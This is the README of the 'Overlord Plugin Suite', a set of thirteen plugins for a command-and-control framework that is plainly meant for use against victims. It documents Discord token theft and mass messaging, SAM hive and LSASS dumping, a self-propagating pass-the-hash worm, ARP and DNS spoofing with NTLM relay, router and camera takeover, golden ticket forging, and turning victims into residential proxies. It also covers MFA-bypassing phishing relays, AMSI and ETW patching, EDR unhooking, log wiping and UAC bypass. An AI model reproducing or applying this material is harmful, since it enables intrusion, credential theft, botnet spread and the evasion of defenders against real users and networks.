# Overlord Plugin Suite

A collection of independent plugins for the Overlord C2 framework. Each plugin is a self-contained bundle: a native shared library that runs inside the agent, an optional server-side module that runs on the operator's VPS, and an HTML panel served by the Overlord web UI.

Thirteen plugins are implemented. They are designed to compose — the output of one feeds the input of the next — but each one builds, installs, and runs on its own.

---

## Contents

| # | Plugin | Category | Requires admin |
|---|--------|----------|----------------|
| 1 | [Whisper](#1-whisper) | Discord | no |
| 2 | [Mimik](#2-mimik) | Credentials | yes |
| 3 | [Lanmap](#3-lanmap) | Recon | no |
| 4 | [Worm](#4-worm) | Lateral movement | yes |
| 5 | [Mitm](#5-mitm) | Network | yes |
| 6 | [Router](#6-router) | Network | no |
| 7 | [Iot](#7-iot) | Network | no |
| 8 | [Admap](#8-admap) | Active Directory | no |
| 9 | [Dcsync](#9-dcsync) | Active Directory | domain admin |
| 10 | [Respool](#10-respool) | Infrastructure | no |
| 11 | [Aitm](#11-aitm) | Phishing | no |
| 12 | [Evasion](#12-evasion) | Evasion | mixed |
| 13 | [Privsec](#13-privsec) | Privilege escalation | admin group |

---

## How plugins work

An Overlord plugin is a **zip file** containing at most six files. The Overlord server extracts it and routes each part to where it belongs:

```
whisper.zip
  whisper-windows-amd64.dll    -> pushed to the agent on the victim machine
  whisper.html                 -> served to the operator's browser
  whisper.css
  whisper.js
  config.json                  -> metadata: id, name, navbar entry, assets
  server.js                    -> runs in a worker process on the VPS
```

**Two halves, two machines.** The `.dll` is a native shared library loaded into the Overlord agent on the victim's machine. It does the work that has to happen locally — reading files, touching the network, spawning processes. The `server.js` runs on your VPS and does everything that does not need to be on the victim: persistence, HTTP calls to third-party APIs, spawning helper binaries, serving the panel.

`config.json` is the only metadata file you write. The server **generates** `manifest.json` on extraction by merging it with what it detects in the bundle, so binaries do not need to be declared anywhere except by their filename convention:

```
<plugin-id>-<os>-<arch>.<ext>
```

That convention is how the server knows `worm-windows-amd64.dll` is the Windows x64 binary. A plugin that targets multiple platforms ships one file per target.

### Native ABI

The agent loads the library and resolves five exports. Four are required:

```c
int  PluginOnLoad(char *hostInfo, int len, unsigned long long cb);
void PluginSetCallback(unsigned long long cb);
int  PluginOnEvent(char *event, int evLen, char *payload, int plLen);
void PluginOnUnload(void);
```

`hostInfo` is JSON — `{clientId, os, arch, version}`. The callback pointer is how the plugin sends data back to the server: it takes `(event, eventLen, payload, payloadLen)` and is called through `syscall.SyscallN` on Windows. Everything crossing that boundary is a JSON string.

On Linux the signature differs — `PluginOnLoad` takes an extra `ctx` argument and the callback is bridged through cgo. Both are implemented in every plugin; the split lives in `exports_windows.go` and `exports_unix.go`.

`PluginOnEvent` is the router. The server sends `{event, payload}` and the plugin switches on `event`. Events are plain strings — `"scan"`, `"spread"`, `"dump_lsass"` — so adding a capability means adding a case and a handler.

### Server module

`server.js` exports a default object with up to four members:

```js
export default {
  setup(ctx) { },                                   // runs once when the plugin is enabled
  onEvent(ctx, clientId, event, payload) { },       // receives everything the agent emits
  rpc: {                                            // callable from the panel
    method_name(ctx, params) { return ...; },
  },
  teardown(ctx) { },
};
```

`ctx.db` is a `bun:sqlite` database backed by `plugins/<id>/data/plugin.db`, in WAL mode. `ctx.dataDir` is that directory. `ctx.broadcast(channel, data)` pushes JSON to every browser subscribed to the plugin's SSE stream. `ctx.log` writes to the server log prefixed with the plugin id.

### Panel

The HTML is injected into the Overlord shell with a base tag pointing at `/plugins/<id>/assets/`, so relative references like `whisper.css` resolve correctly. The panel talks to three endpoints:

```
POST /api/plugins/<id>/rpc              -> call a server-side method
POST /api/clients/<cid>/plugins/<id>/event   -> send an event to the agent
GET  /api/plugins/<id>/stream           -> SSE; named events, not onmessage
```

Two details that are easy to get wrong. First, RPC returns a wrapper — the payload is under `result`, and failures come back as `{ok: false, error}`:

```js
const res = await fetch(`/api/plugins/${ID}/rpc`, { ... });
const body = await res.json();
if (!body.ok) throw new Error(body.error);
return body.result;
```

Second, `ctx.broadcast` emits **named** SSE events. A listener on `es.onmessage` receives nothing; you must register per channel:

```js
es.addEventListener("status", (ev) => { ... });
```

### Building

Each plugin has a `build.bat` that compiles the native library, copies `server.src.js` to `server.js`, and produces the zip. `build-all.bat` in the root builds every plugin in sequence.

```
cd plug
build-all.bat
```

Or individually:

```
cd plug\worm
build.bat
```

Requirements: **Go 1.21+** and a **C compiler** (MinGW-w64 on Windows). The native libraries are built with `-buildmode=c-shared`, which requires cgo — that is why gcc is needed even though the code is Go. One plugin (`whisper`) also needs `go mod tidy` once, because it imports `golang.org/x/sys` for the Windows DPAPI calls.

### Installing

Upload the zip from the **Plugins** page, or drop it into `Overlord-Server/plugins/` and restart the server. Then:

1. Find the plugin in the list and click **enable**
2. Confirm the untrusted-plugin prompt — unsigned plugins are disabled until you do
3. The navbar entry appears and the server worker starts

That third step is the one that matters. A plugin that is uploaded but not enabled has no running server worker, and every RPC returns `Plugin server runtime not running`. It is not an error, it just means the module is not started yet.

To load the native library onto a specific client, use the plugin's own panel or the client's plugin list. Auto-load pushes it to every client that connects, which is how you avoid touching each machine.

### Shared evasion pre-flight

Every plugin applies the same two patches on its first event, before doing anything observable:

- **ETW** — `EtwEventWrite` and its variants return success without writing the event
- **AMSI** — `AmsiScanBuffer` returns success without scanning

Both are in-memory and process-local. They touch no files and no other processes, which is what keeps them quiet. Module resolution walks the PE export table directly rather than calling `GetProcAddress`, because that function is a common hook site.

The patches report their result through an `evasion` event, so the panel shows whether the plugin ran protected. The loud options — terminating security processes, disabling Defender — are not part of the pre-flight. They live only in the `evasion` plugin, behind a confirmation.

---

## 1. Whisper

Discord token harvesting and message delivery.

**What it does.** Reads Discord authentication tokens from the local machine, then sends messages across every server and direct message the token can reach, with randomized delays between sends.

**Token sources.** Three, selectable in the panel:

| Source | How |
|--------|-----|
| Discord app | Reads the LevelDB store under `%APPDATA%\discord\Local Storage\leveldb`. The `os_crypt` key is decrypted with DPAPI, then AES-GCM decrypts each `v10`-prefixed token. |
| Browser session | Same technique against Chromium browsers (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX) and Firefox's `webappsstore.sqlite`. This silently reuses an already-logged-in Discord web session — no window opens. |
| Manual | You paste a token. Works with no client online at all. |

**Two execution modes.** This is the part that trips people up.

*VPS mode* — no client id required. The server-side module does everything over Discord's REST API from your server. Paste a token, set the message, start. The client list never shows this job; it runs under an internal namespace so it cannot be confused with a real client.

*Client mode* — requires a client id. The event is dispatched to the agent, which grabs the token locally and sends from the victim's own IP.

**Delays.** `minDelayMs` and `maxDelayMs` bound a random sleep between each channel. The engine also reads `Retry-After` on a 429 and backs off for exactly that long rather than hammering.

**Targets.** Guild text channels and DMs are discovered from the token. Announcement channels and non-text channels can be excluded.

**Known limitation.** Discord error `40002` means the account requires verification. It is a server-side gate on Discord's end — no token, no code change, and no plugin configuration works around it. Verify the account (usually a phone number) or use a different token.

---

## 2. Mimik

Local credential extraction.

**What it does.** Dumps the three registry hives that together contain every local account secret, plus LSASS process memory.

**The hives.** They only work as a set:

| Hive | Contains |
|------|----------|
| `HKLM\SAM` | NTLM hashes of local accounts |
| `HKLM\SYSTEM` | The boot key that decrypts SAM |
| `HKLM\SECURITY` | LSA secrets — service account passwords, machine account credentials, autologon |

Dumped with `reg save`. **Requires administrator.** The plugin checks first (`check priv`) and reports whether it can proceed rather than failing silently.

Hives under 6 MB are base64-encoded into the event and land in the panel as a download. Larger ones — `SYSTEM` is routinely 10–50 MB — are written to disk and the path is reported so you can pull them through the file browser.

**LSASS.** Dumped via `rundll32 comsvcs.dll MiniDump <pid> <file> full`. This captures plaintext passwords, NTLM hashes, live Kerberos tickets, and cached credentials from *other* users who have logged into that machine. That last category is what makes it worth running on workstations rather than just servers.

Requires administrator **and** `SeDebugPrivilege` to read LSASS. An administrator has both by default.

**Output and use.** The hives go to hashcat (`-m 1000` for NTLM) or `secretsdump`. More usefully, the hashes can be used directly without cracking — see [Worm](#4-worm), which accepts them for pass-the-hash.

---

## 3. Lanmap

Local network mapping.

**What it does.** Enumerates every host visible from the client and identifies what each one is.

Reads the ARP table for live neighbours, then probes seventeen common ports per host with a concurrency cap so a /24 does not take forever. Returns IP, MAC, open ports, and a role guess.

**Role inference.** Derived from port signature and MAC OUI, in that order of reliability:

```
3389 present              -> Windows host
445 + 139                 -> Windows file share
9100 / 515 / 631          -> printer
554 / 8554                -> camera
8008 / 8009               -> Chromecast
53 + 80 + 443             -> router
23                        -> IoT device (telnet)
Raspberry Pi / Espressif OUI  -> by vendor
locally-administered MAC  -> phone (randomized address)
```

That guess is what the downstream plugins consume. `router` reads it to find the gateway; `mitm` reads it to pick spoofing targets; `worm` reads the port list to choose a host.

**No admin required.** Pure read-only socket work.

**Known limitation.** The port list is fixed at seventeen entries. A host running services on non-standard ports shows fewer results, not wrong ones.

---

## 4. Worm

Automated lateral movement.

**What it does.** Authenticates to other machines on the network with credentials you supply and executes the agent on them, then repeats from each new host.

This is the plugin that composes everything: it consumes `lanmap`'s host list and `mimik`'s credentials.

### Credentials — three types

The panel accepts a `users` list and a `secrets` list, and tries every combination. Secrets are prefixed to select the authentication method:

| Prefix | Method |
|--------|--------|
| *(none)* | NTLMv2 response computed from the plaintext password |
| `hash:` | **Pass-the-hash** — no password needed |
| `ticket:` | **Pass-the-ticket** — Kerberos AP-REQ wrapped in SPNEGO |

Hashes are the 32-hex NT hash from `mimik`. Tickets are a base64 `.kirbi`.

**Why this needed a native SMB2 client.** The Windows API that authenticates over SMB (`net use`, `WNetAddConnection2`) has no parameter for an NTLM hash — the protocol at that layer wants the actual secret. Passing a hash through it is not merely unsupported, it is impossible. So the plugin speaks the protocol directly:

```
TCP 445
  NEGOTIATE         (3.1.1, 3.0.2, 3.0, 2.1)
  SESSION_SETUP     Type 1 -> Type 2 challenge -> Type 3 response
  TREE_CONNECT      \\host\ADMIN$   write the payload
  TREE_CONNECT      \\host\IPC$     open \svcctl
  FSCTL_PIPE_TRANSCEIVE  CreateServiceW -> StartServiceW -> DeleteService
```

The NTLM response is computed from the NT hash, which is why having the hash is equivalent to having the password: `NTOWFv2 = HMAC-MD5(NThash, UPPER(user) || domain)`, then the response is HMAC-MD5 over the server challenge and the blob.

Service creation is done over RPC with hand-marshalled NDR rather than shelling out to `sc.exe`, because `sc.exe` would need a logon session — which is exactly what a hash cannot provide.

### Discovery

`discover` reads the ARP table plus `nbtstat -n` for hostnames, then probes 445, 135, 139, 5985, and 3389 on each host. Returns the reachable set with open ports, which tells you which execution method will work before you try.

### Execution methods

Tried in order per credential:

| Method | Transport | Works with hash |
|--------|-----------|-----------------|
| `psexec` | SCM over IPC$\svcctl | yes |
| `schtasks` | SCM over IPC$\svcctl | yes |
| `wmi` | DCOM on 135 | no — password only |

WMI cannot use a hash because Windows has no public API to open a network logon from one. The plugin reports this explicitly rather than failing obscurely.

### Reinfect guard

Before touching a host, the plugin queries a registry marker it writes on successful infection (`HKLM\...\wormid`). A host already carrying the marker is skipped and reported as such. Combined with the server-side target table, this prevents both loops and duplicate work.

### Making it automatic

The loop that propagates without intervention:

```
host A  ->  mimik harvests credentials
        ->  worm authenticates to B with them
        ->  B connects to the C2 as a new client
        ->  kematian auto-collects on B (needs autoLoad + autoStartEvents)
        ->  mimik harvests B's credentials
        ->  worm authenticates to C ...
```

Steps 3 through 5 need no operator action once auto-load is configured on the collection plugin. The bottleneck is always the same: valid administrator credentials on the target. Password reuse is what makes this work — the local administrator password on workstation A is frequently the same on B. On a hardened domain it stalls at the domain controller.

**Known limitation.** SMB 3.x message signing uses AES-CMAC; this implementation uses the HMAC construction. If a server enforces signing you get a clear signature error rather than a hang, but the connection will not complete.

---

## 5. Mitm

Layer-2 network attacks against the client's LAN.

**What it does.** Four attacks, all against the *other* devices on the network rather than the machine the agent runs on.

**ARP spoofing.** Poisons both directions — the victim believes the gateway is at our MAC, and the gateway believes the victim is. A 1.5-second ticker re-asserts the poison because ARP caches expire and the real gateway re-announces. IP forwarding is enabled so traffic actually flows through rather than being black-holed; a victim whose connection dies is an immediate tell. `stop` re-asserts the real MAC mappings so connectivity returns within a second.

**DNS interception.** A UDP/53 responder. Domains in the spoof map get forged A records — exact matches and `*.wildcard` entries. Everything else is forwarded to the configured upstream, so normal browsing keeps working and the hijack stays invisible. Pair this with Router's DNS control to cover the whole network.

**NTLM capture.** LLMNR on 5355 and NBT-NS on 137 are the fallback name-resolution protocols on a Windows LAN. Both are broadcast, so when a host asks "who is FILESERVER?" and DNS has no answer, anything on the segment may reply. The plugin answers every query, which makes the victim authenticate to us, then an SMB listener on 445 issues a Type-2 challenge and extracts user, domain, and hash material from the Type-3 response.

Captured hashes export as hashcat mode 5600.

**SMB relay.** Bridges the victim's NTLM exchange to a target host so a captured authentication is used on your behalf, without cracking. This is the path that makes the hashes `mimik` produces usable against SMB.

Requires administrator — raw sockets for ARP.

**Known limitations.** Port 137 is usually held by Windows' own NetBIOS service, so NBT-NS poisoning often cannot bind; the plugin detects this and continues with LLMNR only. The relay is a byte-bridge that watches the status code — it does not construct SMB2 messages itself.

---

## 6. Router

Gateway takeover.

**What it does.** Authenticates to the client's router, then takes control of the network it serves.

**Detection.** Scans admin ports (80, 443, 8080, 8443, 22, 23), pulls the login page, and fingerprints the brand from the HTML, the `Server` header, and the `WWW-Authenticate` realm. Covers TP-Link, Netgear, ASUS, D-Link, Huawei, MikroTik, and a generic HTTP-Basic fallback.

**Credential attack.** Brand-aware login shapes — form-encoded, JSON, or HTTP Basic — driven by a built-in default list (`admin/admin`, `admin/password`, `root/admin`, and similar). Anything that works lands in the panel with click-to-copy.

**DNS control.** Pushes your resolver to the router. Every device in the house then resolves through you, not just the victim — this is what pairs with `aitm` to redirect a whole household.

**UPnP.** Real SSDP discovery followed by SOAP `AddPortMapping`, giving a direct inbound channel that survives the reverse tunnel dying. The IGD control URL is resolved from the device description rather than assumed.

**DHCP lease dump.** Pulls the router's client table, which yields hostnames for devices that were invisible in ARP.

**No admin required** on the client — this attacks the router, not the machine.

**Known limitations.** Success detection matches response bodies against known strings, and firmware varies, so exotic builds can produce false negatives — a working password reported as failed. Huawei authentication sends plaintext credentials, which older firmware accepts and current firmware rejects.

**Factory reset is deliberately not implemented.** It would erase the configuration you just hijacked, permanently cut the victim's network, and destroy the DNS control you established. The button reports this instead of acting.

---

## 7. Iot

Camera, smart TV, and smart-home device takeover.

**What it does.** Finds IoT devices on the LAN, fingerprints them, and captures from them.

**Scanning.** Probes twenty IoT-specific ports per host and classifies by signature:

```
554 / 8554 / 37777 / 34567  -> camera
8008 / 8009                 -> smart TV (Chromecast)
9100 / 515 / 631            -> printer
1883 / 6668 / 9999          -> smart home hub
8000                        -> Hikvision
```

**ONVIF fingerprinting.** Sends a `GetDeviceInformation` SOAP request to `/onvif/device_service`. Most cameras answer this **unauthenticated**, which returns Manufacturer and Model directly — more reliable than banner scraping.

**Snapshots.** Tries fifteen known snapshot paths across Hikvision, Dahua, Axis, Reolink, and generic firmware, unauthenticated first and then with the default camera credential list. Responses are validated against the JPEG magic bytes so an HTML error page is not saved as an image.

**Anonymous MQTT detection.** Builds a real MQTT 3.1.1 CONNECT with no credentials and reads the CONNACK. An open broker is a door onto every device publishing through it, and it is flagged prominently in the panel.

**Smart TV control.** DIAL app launch on port 8008.

**No admin required.**

**Known limitations.** Video streaming is not implemented — `rtspDescribe` and a full Digest authentication implementation (MD5, qop-aware) exist in the source for Dahua and older Hikvision, but only the snapshot path is wired to the UI. Snapshot paths and vendor fingerprints are heuristic lists; cameras on non-standard ports or HTTPS-only return nothing.

---

## 8. Admap

Active Directory enumeration.

**What it does.** Reads the domain over LDAP and reports the accounts that are worth attacking.

**A hand-written LDAP client.** Overlord plugins are single DLLs with no module system, so a directory library is not an option. LDAP is ASN.1 BER over TCP, and the subset needed for bind and search is small enough to encode directly — roughly 150 lines covering Bind and Search requests, with the filter sent as a raw OCTET STRING.

Domain controllers are located by SRV lookup (`_ldap._tcp.<domain>`), so no hostname is required.

**What it finds.**

| Finding | Severity | Why it matters |
|---------|----------|----------------|
| AS-REP roastable | critical | A crackable hash from a single unauthenticated AS-REQ |
| Kerberoastable SPNs | high | Crackable offline without touching the account |
| Credentials in descriptions | high | Matching pass / pwd / cred / secret / temp in object descriptions |
| adminCount=1 accounts | info | The protected-account target list |
| Delegation SPNs | info | Flagged carefully — see below |

**Delegation is deliberately marked informational.** Unconstrained delegation is identified by the *absence* of `AllowedToDelegateTo`, which the attribute set does not fetch. Flagging it as confirmed would produce false positives.

**No admin required.** Many domains permit unauthenticated LDAP reads, and the plugin tries an anonymous bind by default.

**Known limitations.** The raw OCTET STRING filter assumes ASCII and does not implement every LDAP escape. Ticket extraction is not implemented — see `dcsync`.

---

## 9. Dcsync

Kerberos attack primitives.

**What it does.** Probes domain replication, forges golden tickets, and lists roasting targets.

**Reconnaissance.** Locates domain controllers by SRV, scans the RPC endpoint range, and queries the endpoint mapper for the DRSUAPI interface to determine whether replication is exposed to the current account. Reports the bind string and whether the account holds the rights — the operationally useful question — rather than claiming a dump it cannot perform.

**Golden ticket forging.** Given the krbtgt AES key (16 bytes for AES-128, 32 for AES-256), this produces a real KRBTGT-signed TGT for an identity you choose, downloadable as a `.kirbi`. The implementation includes the encryption and the DER encoding of the ticket structures.

**Kerberos cryptography.** The primitives are implemented directly, because Go's standard library does not provide them:

```
MD4                     NT hash
HMAC-MD5 + RC4-HMAC     etype 23, per RFC 4757
PBKDF2-SHA1 + AES-CTS   etypes 17/18, per RFC 3962
RFC 3961 n-fold         key derivation
```

AES-CTS includes ciphertext stealing, which is what makes the final block terminate correctly.

**Roasting.** `kerberoast` and `asrep` list accounts with an SPN and accounts without Kerberos pre-authentication, and build a valid AS-REQ for a named target.

Requires domain administrator rights for the replication path.

**Known limitations, stated plainly.** The full DRSUAPI `DrsGetNCChanges` exchange requires NDR marshalling of the replication structures and is not implemented, so the plugin **probes and reports** rather than dumping hashes. On the ticket side, AS-REQ construction is real and produces a transferable request, but KDC response parsing and RC4 ticket decryption are not wired — you get a request, not a cracked hash. The cryptography is real; the RPC layer is reconnaissance.

---

## 10. Respool

Residential proxy pool.

**What it does.** Turns each victim into a rotating residential exit node and exposes the pool as a proxy for your own traffic. Two binaries, deployed in different places.

```
[browser or tool] --CONNECT/SOCKS5--> [gateway on your VPS] --muxed tunnel--> [node on the victim] --> [target]
```

**The node** (`respool-windows-amd64.dll`) runs on the victim. It **never listens** — it dials out to the gateway and holds one long-lived connection, which is why it works behind NAT, survives most firewalls, and looks like an ordinary outbound HTTPS keepalive. It reconnects with bounded exponential backoff so a gateway outage does not become a reconnect storm, caps concurrent streams, and keeps the tunnel alive with a 20-second keepalive.

**The gateway** (`respool-gateway.exe`) runs on your VPS and is a complete proxy server:

- **HTTP CONNECT** plus absolute-URI GET, with `Proxy-Authorization` parsing
- **SOCKS5** — method negotiation, username/password sub-negotiation, IPv4, domain, and IPv6 address types
- **Rotation** — random selection, or sticky by API key so a session keeps one exit IP
- **Per-key metering** — bandwidth accounting and quotas
- **Management API** — `/nodes`, `/keys`, `/usage`

**The tunnel protocol.** A 9-byte framed multiplexer carrying many logical streams over one connection:

```
[1 byte type][4 bytes stream id][4 bytes length][length bytes payload]
```

Stream identifiers are split even/odd between the two sides so neither has to negotiate. Frames are capped at 64 KB so a hostile peer cannot force a large allocation.

**Installation.** The zip contains both binaries. `server.js` spawns and supervises the gateway from the plugin's data directory; the panel has start/stop controls and generates the shared token.

**Known limitations.** Geo and ASN filtering are scaffolded but have no IP-to-country data behind them — the parameter exists, the lookup does not. TLS uses `InsecureSkipVerify`, so the tunnel is encrypted but the gateway certificate is not validated.

---

## 11. Aitm

Phishing infrastructure.

**What it does.** Runs a reverse proxy that sits between the victim and a real site, capturing credentials as they are submitted and session cookies as they return.

**Why the cookie matters more than the password.** A session cookie obtained this way is **already authenticated and already past MFA**. It needs no cracking, no replay window, and no password reuse. This is the difference between credential theft and account takeover.

**The relay** is a working HTTPS proxy, not a cloned page:

- maintains a cookie jar so the upstream session stays consistent
- **strips `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, and `Expect-CT`** from responses — without this the browser refuses to run the relayed page
- **rewrites absolute origin references** to the phishing host so links, form actions, and XHR keep flowing through the relay
- **re-scopes `Set-Cookie` domains** to your host, because the browser rejects cookies for another domain
- **removes SRI `integrity` attributes** (they break once URLs are rewritten), **frame-busters**, and **service-worker registrations** — all three actively fight a relay

Credential capture parses both form-encoded and JSON bodies, matching field names against password / OTP / token patterns.

**Lookalike generation.** Produces candidate domains from a target: Unicode homograph substitutions across 25+ characters, a real RFC 3492 punycode encoder for the `xn--` form, transposition / omission / doubling typosquats, alternative TLDs, and hyphenated or prefixed variants.

**Captive portal.** Serves a sign-in page over the local network, which pairs with a rogue access point — anyone who joins is asked to authenticate.

**OAuth consent.** Constructs an authorization-code request. If the victim approves it, the grant is a **persistent API token that survives a password change**, which is why consent phishing outlives ordinary credential theft.

**No admin required.**

**Known limitations.** The relay serves HTTP and needs a genuine certificate on your phishing domain, or the victim sees a warning. The browser-in-the-browser page is implemented as a generator but is not wired to a route. Consent phishing requires a registered application, and current tenants block user consent for those scopes by default.

---

## 12. Evasion

Telemetry suppression and anti-forensics.

**What it does.** Neutralizes the user-mode visibility an EDR depends on, and removes the artifacts an investigation would look for.

### Memory patches — silent, process-local

**AMSI.** Patches `AmsiScanBuffer` to return success immediately (`xor eax,eax; ret`), so nothing is scanned. `AmsiOpenSession` is patched too, so the session cannot be reused to detect the first patch.

**ETW.** Patches `EtwEventWrite` and the Full, Ex, and WriteString variants to return success without writing. This is what blinds the telemetry an EDR agent consumes, including .NET assembly loads and script-block logging.

**ntdll unhooking.** EDR products hook ntdll's syscall stubs in user mode. The plugin reads a clean copy of `ntdll.dll` from disk, locates the `.text` section, and overwrites the loaded copy with it, removing the hooks. Calls then look like they came from an unhooked process.

Module resolution for all three **walks the PEB** (`PEB → Ldr → InMemoryOrderModuleList`) and parses the PE export table directly. `GetModuleHandle`, `LoadLibrary`, and `GetProcAddress` are not called, because those are exactly where hooks sit.

### Anti-forensics

Clears Windows event logs (Security, System, Application, PowerShell, Sysmon by default), deletes Prefetch entries, clears recent-files and PowerShell command history, and copies timestamps from a legitimate file onto an artifact so it inherits dates that belong there.

### Defense reconnaissance

Reads installed AV products from the Security Center namespace and sweeps running process names for CrowdStrike, SentinelOne, Carbon Black, Cortex, Elastic, Sophos, McAfee, Symantec, Trend Micro, Kaspersky, and ESET. Reads Defender's state including whether Tamper Protection is active.

### Loud actions

Terminating security processes and modifying Defender preferences are the loudest possible operations — the terminations themselves generate the alerts the rest of the plugin exists to avoid. They are isolated in a separate card with a confirmation prompt, and Tamper Protection blocks the Defender path entirely on current builds. That failure is expected, not exceptional.

---

## 13. Privsec

Privilege escalation.

**What it does.** Gets you from a user context to SYSTEM, which is what `mimik` needs to read LSASS.

**Token theft.** Finds SYSTEM processes (winlogon, lsass, services, svchost), enables `SeDebugPrivilege`, opens the target, and duplicates its token. Two paths, because they enable different things:

- **Primary token** (`DuplicateTokenEx` → `CreateProcessWithTokenW`) — spawns processes that run as SYSTEM
- **Impersonation token** (`ImpersonateLoggedOnUser`) — acts as SYSTEM for the plugin's own API calls

This is the largest single jump available from a medium-integrity foothold.

**UAC bypass.** Abuses binaries that Windows marks `auto-elevate="true"` in their manifest. Such a binary, launched by a user in the Administrators group, elevates without a prompt — and if it loads anything from a user-writable location, that load is our code.

| Method | Mechanism |
|--------|-----------|
| `fodhelper` | Plants `HKCU\Software\Classes\ms-settings\Shell\Open\command` with an empty `DelegateExecute`, launches the auto-elevating binary, then removes the keys |
| `computerdefaults` | Same class-hijack pattern |
| `eventvwr` | MMC snap-in hijack via the `mscfile` association |

**Privilege reconnaissance.** Reads `whoami /priv` and maps the privileges that lead somewhere:

```
SeImpersonatePrivilege     -> potato attacks
SeAssignPrimaryToken       -> token assignment
SeDebugPrivilege           -> LSASS access, injection
SeBackupPrivilege          -> direct hive copy
SeRestorePrivilege         -> replace system binaries
SeTakeOwnershipPrivilege   -> take ownership of any object
SeLoadDriverPrivilege      -> BYOVD
```

It also reads the UAC consent level from the registry and reports whether it is bypassable — levels 4 and 5 are, levels 1 through 3 are not.

**Recommendations.** The panel reads the host's posture and states what to do next on that specific machine: "already elevated, go straight to mimik" versus "standard user, look for a service account."

**Known limitations.** Potato attacks are detected and recommended but not executed — the COM and DCOM coercion that makes them work needs an OXID resolver and a local RPC listener, which are not implemented. The recon reports that `SeImpersonate` is present and that a potato applies; it does not fire one. UAC bypass requires membership in Administrators — it is an elevation from admin-but-not-elevated, not a path from a standard user, and the plugin refuses clearly when that precondition is absent. Token theft requires admin for `SeDebugPrivilege`, so it cannot bootstrap from nothing.

---

## Composition

The plugins are independent, but they chain. The intended order:

```
RECONNAISSANCE        lanmap, admap
CREDENTIALS           mimik, mitm
LATERAL MOVEMENT      worm
INFRASTRUCTURE        router, iot, respool
DOMAIN                admap, dcsync
PHISHING              aitm
COVERAGE              evasion, privsec
```

A full chain from a single implant:

```
lanmap  ->  identify hosts
mimik   ->  harvest credentials from the host you control
worm    ->  spread using those credentials
              |
              +-> new hosts connect to the C2
              +-> collection plugin auto-runs on each
              +-> repeat

router  ->  take the gateway
mitm    ->  DNS hijack, capture hashes from other devices
aitm    ->  relay those devices into session cookies

admap   ->  enumerate the domain
dcsync  ->  forge a golden ticket
```

Prerequisite chains worth knowing before you start:

- `worm` consumes `mimik` output and `lanmap` targets
- `dcsync` consumes `admap` domain data
- `router` feeds `aitm` by redirecting a whole network's DNS
- `mimik` needs the elevation that `privsec` provides on a non-admin foothold
- everything loud benefits from `evasion` running first

## Status

Thirteen plugins build clean and produce verified bundles. The native libraries are compile-verified across the suite.

What has been executed against a real target is a smaller set. Where a plugin's riskiest capability is reconnaissance rather than action, that is stated in its section rather than implied by the feature list — `dcsync` probes replication instead of dumping, `iot` captures snapshots instead of streams, `worm` supports pass-the-hash only over SMB2 and not over WMI, `privsec` identifies potato applicability instead of exploiting it.

The cross-plugin contracts are the least verified part. `worm` reads `lanmap` output, `dcsync` reads `admap` output, and `respool`'s node and gateway agree on a wire format — each of those is two independently built halves agreeing on a protocol, which is precisely where silent breakage hides.

`respool` is the most testable entry point because both halves are yours: run the gateway, start a node on a machine you own, and route a request through the proxy. No victim, no domain, no elevation required.
